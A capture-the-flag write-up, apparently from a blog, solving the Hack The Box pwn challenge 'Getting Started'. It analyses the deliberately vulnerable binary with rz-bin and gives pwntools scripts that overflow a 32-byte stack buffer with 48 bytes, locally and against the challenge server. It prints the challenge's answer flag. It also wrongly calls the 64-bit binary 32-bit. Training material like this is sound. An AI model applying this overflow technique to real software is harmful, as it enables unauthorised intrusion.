+++
title = "Getting Started"
date = "2023-12-31"
description = "This is a very easy Pwn challenge."
[extra]
cover = "cover.svg"
toc = true
+++

# Information

**Difficulty**: Very easy

**Category**: Pwn

**Release date**: 2023-04-14

**Created by**: [w3th4nds](https://app.hackthebox.com/users/70668)

**Description**: Get ready for the last guided challenge and your first real exploit. It's time to show your hacking skills.

# Setup

I'll complete this challenge using a Linux VM. I'll create a `workspace` directory at `/` to hold all the files related to this challenge.

Throughout this write-up, the target machine's IP address will be `188.166.175.58`, and the port will be `31551`. The commands ran on my machine will be prefixed with `❯` for clarity.

# Identification

```sh
❯ tree -a "/workspace"
```

```
/workspace
├── flag.txt
├── glibc
│   ├── ld-linux-x86-64.so.2
│   └── libc.so.6
├── gs
└── wrapper.py

<SNIP>
```

The challenge is comprised of several files. The most interesting are `flag.txt`, which contains a test string, the `wrapper.py`, which contains a base for the exploit development phase that we'll have to build upon, and the `gs` binary. It's probably meant to be run pn Linux, but let's confirm this by running `file` on it.

```sh
❯ file /workspace/gs
```

```
/workspace/gs: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=505eb225ba13a677aa5f00d5e3d840f63237871f, for GNU/Linux 3.2.0, not stripped
```

Okay, so it looks like this is an ELF 32-bit, LSB executable.

Let's find more information about it using `zn-bin`.

```sh
❯ rz-bin -I /workspace/gs
```

```
[Info]
arch     x86
cpu      N/A
baddr    0x00000000
binsz    0x00003bf1
bintype  elf
bits     64
class    ELF64
compiler GCC: (Debian 10.2.1-6) 10.2.1 20210110
dbg_file N/A
endian   LE
hdr.csum N/A
guid     N/A
intrp    ./glibc/ld-linux-x86-64.so.2
laddr    0x00000000
lang     c
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
os       linux
cc       N/A
pcalign  0
relro    full
rpath    ./glibc/
subsys   linux
stripped false
crypto   false
havecode true
va       true
sanitiz  false
static   false
linenum  true
lsyms    true
canary   false
PIE      true
RELROCS  true
NX       true
```

This confirms the information we got with `file`.

We notice that there are a few protections in place. Let's hope that it won't be too troublesome when it gets to the actual exploitation of the binary.

# Libraries

Let's find the list of libraries used by this binary.

```sh
❯ rz-bin -l /workspace/gs
```

```
[Libs]
library   
----------
libc.so.6
```

So this binary uses the `libc.so.6` library, which provides the fundamental functionalities for programs written in C.

# Imports

Now, let's find the list of imports used by this binary.

```sh
❯ rz-bin -i /workspace/gs
```

```
[Imports]
nth vaddr      bind   type   lib name                        
-------------------------------------------------------------
1   0x00001030 GLOBAL FUNC       putchar
2   ---------- WEAK   NOTYPE     _ITM_deregisterTMCloneTable
3   0x00001040 GLOBAL FUNC       puts
4   0x00001050 GLOBAL FUNC       strlen
5   0x00001060 GLOBAL FUNC       printf
6   0x00001070 GLOBAL FUNC       alarm
7   0x00001080 GLOBAL FUNC       close
8   0x00001090 GLOBAL FUNC       fputc
9   0x000010a0 GLOBAL FUNC       read
10  ---------- GLOBAL FUNC       __libc_start_main
11  ---------- WEAK   NOTYPE     __gmon_start__
12  0x000010b0 GLOBAL FUNC       setvbuf
13  0x000010c0 GLOBAL FUNC       open
14  0x000010d0 GLOBAL FUNC       perror
15  0x000010e0 GLOBAL FUNC       __isoc99_scanf
16  0x000010f0 GLOBAL FUNC       exit
17  ---------- WEAK   NOTYPE     _ITM_registerTMCloneTable
19  0x00001100 WEAK   FUNC       __cxa_finalize
```

So this binary imports functions like `putchar` and `strlen` to work with strings, but also `open`, `read` and `close` to work with files. The `printf` function is likely used to print text to the terminal.

# Symbols

Let's find the list of symbols for this binary.

```sh
❯ rz-bin -s /workspace/gs
```

```
[Symbols]
nth paddr      vaddr      bind   type   size lib name                                   
----------------------------------------------------------------------------------------
18  ---------- 0x00004010 GLOBAL OBJ    8        stdout
20  ---------- 0x00004020 GLOBAL OBJ    8        stdin
1   0x000002a8 0x000002a8 LOCAL  SECT   0        .interp
2   0x000002c8 0x000002c8 LOCAL  SECT   0        .note.gnu.build-id
3   0x000002ec 0x000002ec LOCAL  SECT   0        .note.ABI-tag
4   0x00000310 0x00000310 LOCAL  SECT   0        .gnu.hash
5   0x00000340 0x00000340 LOCAL  SECT   0        .dynsym
6   0x00000538 0x00000538 LOCAL  SECT   0        .dynstr
7   0x00000630 0x00000630 LOCAL  SECT   0        .gnu.version
8   0x00000660 0x00000660 LOCAL  SECT   0        .gnu.version_r
9   0x00000690 0x00000690 LOCAL  SECT   0        .rela.dyn
10  0x00000780 0x00000780 LOCAL  SECT   0        .rela.plt
11  0x00001000 0x00001000 LOCAL  SECT   0        .init
12  0x00001020 0x00001020 LOCAL  SECT   0        .plt
13  0x00001100 0x00001100 LOCAL  SECT   0        .plt.got
14  0x00001110 0x00001110 LOCAL  SECT   0        .text
15  0x00001864 0x00001864 LOCAL  SECT   0        .fini
16  0x00002000 0x00002000 LOCAL  SECT   0        .rodata
17  0x000026fc 0x000026fc LOCAL  SECT   0        .eh_frame_hdr
18  0x00002758 0x00002758 LOCAL  SECT   0        .eh_frame
19  0x00002d48 0x00003d48 LOCAL  SECT   0        .init_array
20  0x00002d50 0x00003d50 LOCAL  SECT   0        .fini_array
21  0x00002d58 0x00003d58 LOCAL  SECT   0        .dynamic
22  0x00002f58 0x00003f58 LOCAL  SECT   0        .got
23  0x00003000 0x00004000 LOCAL  SECT   0        .data
24  ---------- 0x00004010 LOCAL  SECT   0        .bss
25  0x00000000 0x00000000 LOCAL  SECT   0        .comment
26  0x00000000 0x00000000 LOCAL  FILE   0        crtstuff.c
27  0x00001140 0x00001140 LOCAL  FUNC   0        deregister_tm_clones
28  0x00001170 0x00001170 LOCAL  FUNC   0        register_tm_clones
29  0x000011b0 0x000011b0 LOCAL  FUNC   0        __do_global_dtors_aux
30  ---------- 0x00004028 LOCAL  OBJ    1        completed.0
31  0x00002d50 0x00003d50 LOCAL  OBJ    0        __do_global_dtors_aux_fini_array_entry
32  0x000011f0 0x000011f0 LOCAL  FUNC   0        frame_dummy
33  0x00002d48 0x00003d48 LOCAL  OBJ    0        __frame_dummy_init_array_entry
34  0x00000000 0x00000000 LOCAL  FILE   0        gs.c
35  0x00000000 0x00000000 LOCAL  FILE   0        crtstuff.c
36  0x000028dc 0x000028dc LOCAL  OBJ    0        __FRAME_END__
37  0x00000000 0x00000000 LOCAL  FILE   0        
38  0x00002d50 0x00003d50 LOCAL  NOTYPE 0        __init_array_end
39  0x00002d58 0x00003d58 LOCAL  OBJ    0        _DYNAMIC
40  0x00002d48 0x00003d48 LOCAL  NOTYPE 0        __init_array_start
41  0x000026fc 0x000026fc LOCAL  NOTYPE 0        __GNU_EH_FRAME_HDR
42  0x00002f58 0x00003f58 LOCAL  OBJ    0        _GLOBAL_OFFSET_TABLE_
43  0x00001000 0x00001000 LOCAL  FUNC   0        _init
44  0x00001860 0x00001860 GLOBAL FUNC   1        __libc_csu_fini
47  ---------- 0x00004010 GLOBAL OBJ    8        stdout@GLIBC_2.2.5
48  0x00003000 0x00004000 WEAK   NOTYPE 0        data_start
50  ---------- 0x00004020 GLOBAL OBJ    8        stdin@GLIBC_2.2.5
51  ---------- 0x00004010 GLOBAL NOTYPE 0        _edata
52  0x00001864 0x00001864 GLOBAL FUNC   0        _fini
60  0x00003000 0x00004000 GLOBAL NOTYPE 0        __data_start
62  0x00003008 0x00004008 GLOBAL OBJ    0        __dso_handle
63  0x00002000 0x00002000 GLOBAL OBJ    4        _IO_stdin_used
64  0x00001800 0x00001800 GLOBAL FUNC   93       __libc_csu_init
65  0x000013f9 0x000013f9 GLOBAL FUNC   602      show_stack
66  0x000011f5 0x000011f5 GLOBAL FUNC   125      win
67  ---------- 0x00004030 GLOBAL NOTYPE 0        _end
68  0x00001110 0x00001110 GLOBAL FUNC   43       _start
69  ---------- 0x00004010 GLOBAL NOTYPE 0        __bss_start
70  0x000016a0 0x000016a0 GLOBAL FUNC   352      main
76  ---------- 0x00004010 GLOBAL OBJ    0        __TMC_END__
78  0x00001272 0x00001272 GLOBAL FUNC   391      buffer_demo
80  0x00001653 0x00001653 GLOBAL FUNC   77       setup
1   0x00001030 0x00001030 GLOBAL FUNC   16       imp.putchar
2   ---------- ---------- WEAK   NOTYPE 0        imp._ITM_deregisterTMCloneTable
3   0x00001040 0x00001040 GLOBAL FUNC   16       imp.puts
4   0x00001050 0x00001050 GLOBAL FUNC   16       imp.strlen
5   0x00001060 0x00001060 GLOBAL FUNC   16       imp.printf
6   0x00001070 0x00001070 GLOBAL FUNC   16       imp.alarm
7   0x00001080 0x00001080 GLOBAL FUNC   16       imp.close
8   0x00001090 0x00001090 GLOBAL FUNC   16       imp.fputc
9   0x000010a0 0x000010a0 GLOBAL FUNC   16       imp.read
10  ---------- ---------- GLOBAL FUNC   0        imp.__libc_start_main
11  ---------- ---------- WEAK   NOTYPE 0        imp.__gmon_start__
12  0x000010b0 0x000010b0 GLOBAL FUNC   16       imp.setvbuf
13  0x000010c0 0x000010c0 GLOBAL FUNC   16       imp.open
14  0x000010d0 0x000010d0 GLOBAL FUNC   16       imp.perror
15  0x000010e0 0x000010e0 GLOBAL FUNC   16       imp.__isoc99_scanf
16  0x000010f0 0x000010f0 GLOBAL FUNC   16       imp.exit
17  ---------- ---------- WEAK   NOTYPE 0        imp._ITM_registerTMCloneTable
19  0x00001100 0x00001100 WEAK   FUNC   16       imp.__cxa_finalize
```

We notice a `gs.c` entry, and some of the functions we discovered in the last section.

# Strings

Finally, let's retrieve the list of strings contained in this binary.

```sh
❯ rz-bin -z /workspace/gs
```

```
[Strings]
nth paddr      vaddr      len size section type   string                                                                                                                                                                                                                                                                                                         
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
0   0x00002008 0x00002008 10  11   .rodata ascii  ./flag.txt
1   0x00002018 0x00002018 59  60   .rodata ascii  \nError opening flag.txt, please contact an Administrator.\n\n
2   0x00002054 0x00002054 7   8    .rodata ascii  \e[1;34m
3   0x00002060 0x00002060 31  32   .rodata ascii  \e[4mStack frame layout\e[0m%s \n\n
4   0x00002080 0x00002080 35  36   .rodata ascii  |      .      | <- Higher addresses
5   0x000020a4 0x000020a4 15  16   .rodata ascii  |      .      |
6   0x000020b4 0x000020b4 15  16   .rodata ascii  |_____________|
7   0x000020c4 0x000020c4 28  29   .rodata ascii  |             | <- %d bytes\n
8   0x000020e1 0x000020e1 15  16   .rodata ascii  | Return addr |
9   0x000020f1 0x000020f1 15  16   .rodata ascii  |     RBP     |
10  0x00002101 0x00002101 15  16   .rodata ascii  |   target    |
11  0x00002111 0x00002111 15  16   .rodata ascii  |  alignment  |
12  0x00002121 0x00002121 16  17   .rodata ascii  |  Buffer[%d] |\n
13  0x00002132 0x00002132 15  16   .rodata ascii  |             |
14  0x00002142 0x00002142 15  16   .rodata ascii  |  Buffer[0]  |
15  0x00002158 0x00002158 34  35   .rodata ascii  |_____________| <- Lower addresses
16  0x0000217b 0x0000217b 13  14   .rodata ascii        [Value]
17  0x00002189 0x00002189 12  13   .rodata ascii        [Addr]
18  0x00002196 0x00002196 14  15   .rodata ascii  \n\n%-19s|%-20s\n
19  0x000021a8 0x000021a8 39  40   .rodata ascii  -------------------+-------------------
20  0x000021d0 0x000021d0 7   8    .rodata ascii  \e[1;32m
21  0x000021d8 0x000021d8 23  24   .rodata ascii  0x%016lx | %s0x%016lx%s
22  0x000021f0 0x000021f0 24  25   .rodata ascii   <- %sStart of buffer%s\n
23  0x00002209 0x00002209 7   8    .rodata ascii  \e[1;31m
24  0x00002211 0x00002211 25  26   .rodata ascii   <- %sTarget to change%s\n
25  0x0000222b 0x0000222b 19  20   .rodata ascii  0x%016lx | 0x%016lx
26  0x0000223f 0x0000223f 29  30   .rodata ascii   <- Dummy value for alignment
27  0x0000225d 0x0000225d 13  14   .rodata ascii   <- Saved rbp
28  0x0000226b 0x0000226b 24  25   .rodata ascii   <- Saved return address
29  0x00002288 0x00002288 91  92   .rodata ascii  \nAfter we insert 4 "A"s, (the hex representation of A is 0x41), the stack layout like this:
30  0x000022e8 0x000022e8 97  98   .rodata ascii  \nAfter we insert 4 "B"s, (the hex representation of B is 0x42), the stack layout looks like this:
31  0x00002350 0x00002350 301 302  .rodata ibm037 SpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpiSpi\nSpi
32  0x0000247e 0x0000247e 96  97   .rodata utf8                                                                                                   
33  0x000024e5 0x000024e5 97  98   .rodata utf8     Fill the 32-byte buffer, overwrite the alginment address and the "target's" 0xdeadbeef value.  
34  0x0000254d 0x0000254d 97  98   .rodata utf8                                                                                                    
35  0x000025b1 0x000025b1 105 304  .rodata utf8   \n◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉\n\n>>  blocks=Basic Latin,Geometric Shapes
36  0x000026e4 0x000026e4 20  21   .rodata ascii  \n%s[-] You failed!\n\n
```

There's `37` strings.

It looks like a binary purposefully vulnerable to a buffer overflow, the strings guide us to exploit it.

# Execution

Let's execute this binary and see how it behaves.

```sh
❯ /workspace/gs
```

```
Stack frame layout 

|      .      | <- Higher addresses
|      .      |
|_____________|
|             | <- 64 bytes
| Return addr |
|_____________|
|             | <- 56 bytes
|     RBP     |
|_____________|
|             | <- 48 bytes
|   target    |
|_____________|
|             | <- 40 bytes
|  alignment  |
|_____________|
|             | <- 32 bytes
|  Buffer[31] |
|_____________|
|      .      |
|      .      |
|_____________|
|             |
|  Buffer[0]  |
|_____________| <- Lower addresses


      [Addr]       |      [Value]       
-------------------+-------------------
0x00007ffc5992bf50 | 0x0000000000000000 <- Start of buffer
0x00007ffc5992bf58 | 0x0000000000000000
0x00007ffc5992bf60 | 0x0000000000000000
0x00007ffc5992bf68 | 0x0000000000000000
0x00007ffc5992bf70 | 0x6969696969696969 <- Dummy value for alignment
0x00007ffc5992bf78 | 0x00000000deadbeef <- Target to change
0x00007ffc5992bf80 | 0x000055a9dcd56800 <- Saved rbp
0x00007ffc5992bf88 | 0x00007fcee1e21c87 <- Saved return address
0x00007ffc5992bf90 | 0x0000000000000001
0x00007ffc5992bf98 | 0x00007ffc5992c068


After we insert 4 "A"s, (the hex representation of A is 0x41), the stack layout like this:


      [Addr]       |      [Value]       
-------------------+-------------------
0x00007ffc5992bf50 | 0x0000000041414141 <- Start of buffer
0x00007ffc5992bf58 | 0x0000000000000000
0x00007ffc5992bf60 | 0x0000000000000000
0x00007ffc5992bf68 | 0x0000000000000000
0x00007ffc5992bf70 | 0x6969696969696969 <- Dummy value for alignment
0x00007ffc5992bf78 | 0x00000000deadbeef <- Target to change
0x00007ffc5992bf80 | 0x000055a9dcd56800 <- Saved rbp
0x00007ffc5992bf88 | 0x00007fcee1e21c87 <- Saved return address
0x00007ffc5992bf90 | 0x0000000000000001
0x00007ffc5992bf98 | 0x00007ffc5992c068
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
After we insert 4 "B"s, (the hex representation of B is 0x42), the stack layout looks like this:                                                                                                                                           
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
      [Addr]       |      [Value]                                                                                                                                                                                                          
-------------------+-------------------                                                                                                                                                                                                    
0x00007ffc5992bf50 | 0x4242424241414141 <- Start of buffer                                                                                                                                                                                 
0x00007ffc5992bf58 | 0x0000000000000000                                                                                                                                                                                                    
0x00007ffc5992bf60 | 0x0000000000000000                                                                                                                                                                                                    
0x00007ffc5992bf68 | 0x0000000000000000                                                                                                                                                                                                    
0x00007ffc5992bf70 | 0x6969696969696969 <- Dummy value for alignment                                                                                                                                                                       
0x00007ffc5992bf78 | 0x00000000deadbeef <- Target to change                                                                                                                                                                                
0x00007ffc5992bf80 | 0x000055a9dcd56800 <- Saved rbp                                                                                                                                                                                       
0x00007ffc5992bf88 | 0x00007fcee1e21c87 <- Saved return address                                                                                                                                                                            
0x00007ffc5992bf90 | 0x0000000000000001                                                                                                                                                                                                    
0x00007ffc5992bf98 | 0x00007ffc5992c068                                                                                                                                                                                                    
                                                                                                                                                                                                                                           
◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉                                                                                                                                        
◉                                                                                                 ◉                                                                                                                                        
◉  Fill the 32-byte buffer, overwrite the alginment address and the "target's" 0xdeadbeef value.  ◉                                                                                                                                        
◉                                                                                                 ◉                                                                                                                                        
◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉                                                                                                                                        
                                                                                                                                                                                                                                           
>>
```

As we suspected, this program really guides us. We have to fill the buffer and overwrite the 'target' value.

# Exploit

This program should be easy to exploit.

We see that the buffer is made of `32` bytes, and that there's `8` bytes of dummy values, for alignment according to the program. Therefore, there's `40` bytes between the start of the buffer and the target memory address. If we want to fill the entire target memory address with garbage values, we'll have to enter `8` more bytes of data, so we'll have to enter `48` bytes of garbage to completely overwrite the memory address of the target.

## Local

First, I'll test locally if our strategy works, using this script:

```py
from pwn import *

# Open process
PATH = "/workspace/gs"
p = process(PATH)

# Craft payload
payload = b"A" * 48

# Send payload
p.sendline(payload)

# Read flag
success(f'Flag --> {p.recvline_contains(b"HTB").strip().decode()}')
```

I'll save it as `exploit.py`, an I'll run it.

```sh
❯ python3 /workspace/exploit.py
```

```
[+] Starting local process '/workspace/gs': pid 2620
[*] Process '/workspace/gs' stopped with exit code 0 (pid 2620)
[+] Flag --> HTB{f4k3_fl4g_4_t35t1ng}
```

It successfully retrieved the content of `flag.txt`!

## Remote

Let's adapt the previous script to interact with the remote server.

```py
from pwn import *

# Open connection
IP = "188.166.175.58"
PORT = 31551
r = remote(IP, PORT)

# Craft payload
payload = b"A" * 48

# Send payload
r.sendline(payload)

# Read flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')
```

Let's try it!

```sh
❯ python3 /workspace/exploit.py
```

```
[+] Opening connection to 188.166.175.58 on port 31551: Done
[+] Flag --> HTB{b0f_tut0r14l5_4r3_g00d}
[*] Closed connection to 188.166.175.58 port 31551
```

Nice!

# Afterwords

![Success](success.png)

That's it for this challenge! It was extremely easy for me, as stack-based buffer overflow are really classic and this one only required to fill the buffer with random values.

Thanks for reading!